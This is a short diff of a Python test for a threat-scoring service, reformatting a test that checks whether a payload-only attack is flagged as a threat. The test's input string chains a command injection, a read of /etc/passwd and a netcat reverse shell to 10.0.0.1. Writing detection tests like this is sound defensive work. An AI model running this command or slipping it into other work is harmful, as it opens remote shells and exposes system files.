@@ -123,9 +123,7 @@ def test_score_payload_only(client) -> None:
 
 def test_malicious_payload_only_is_flagged(client) -> None:
     """A clear payload-only attack must not be suppressed by absent tabular signals."""
-    resp = client.post(
-        "/score", json={"payload": "; cat /etc/passwd; nc 10.0.0.1 4444 -e /bin/sh"}
-    )
+    resp = client.post("/score", json={"payload": "; cat /etc/passwd; nc 10.0.0.1 4444 -e /bin/sh"})
     body = resp.json()
     assert body["decision_source"] == "text-only"
     assert body["is_threat"] is True  # the bug fix: text model decides, not fusion
